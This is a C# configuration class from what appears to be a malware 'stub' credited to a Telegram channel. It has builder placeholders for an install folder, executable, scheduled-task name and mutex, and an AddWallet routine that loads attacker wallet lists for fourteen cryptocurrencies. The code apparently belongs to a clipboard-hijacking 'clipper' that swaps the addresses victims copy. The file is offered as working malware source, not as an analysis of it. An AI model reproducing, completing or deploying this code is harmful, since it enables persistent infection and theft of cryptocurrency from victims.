﻿// By https://t.me/devxstudio
using Stub.Help;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;

namespace Stub
{
    class Config
    {
        public static string dir = "%DIR%";
        public static string bin = "%EXE%";
        public static string taskName = "%TASKNAME%";
        public static string MutEx = "%MUTEX%";

        public static string[] BTC_BC1 = { "", };
        public static string[] BTC = { "", };
        public static string[] BCH = { "", };
        public static string[] DOGE = { "", };
        public static string[] ETH = { "", };
        public static string[] LTC = { "", };
        public static string[] XMR = { "", };
        public static string[] xlm = { "", };
        public static string[] xrp = { "", };
        public static string[] nec = { "", };
        public static string[] dash = { "", };
        public static string[] trx = { "", };
        public static string[] zcash = { "", };
        public static string[] bnb = { "", };

        public static void AddWallet()
        {
            try
            {
                BTC_BC1 = "%BTC_BC1%".Split(',');
                BTC = "%BTC%".Split(',');
                BCH = "%BCH%".Split(',');
                DOGE = "%DOGE%".Split(',');
                ETH = "%ETH%".Split(',');
                LTC = "%LTC%".Split(',');
                XMR = "%XMR%".Split(',');
                xlm = "%xlm%".Split(',');
                xrp = "%xrp%".Split(',');
                nec = "%nec%".Split(',');
                dash = "%dash%".Split(',');
                trx = "%trx%".Split(',');
                zcash = "%zcash%".Split(',');
                bnb = "%bnb%".Split(',');
              
            }
            catch
            {
                Environment.Exit(0);
            }
        }

    }
}
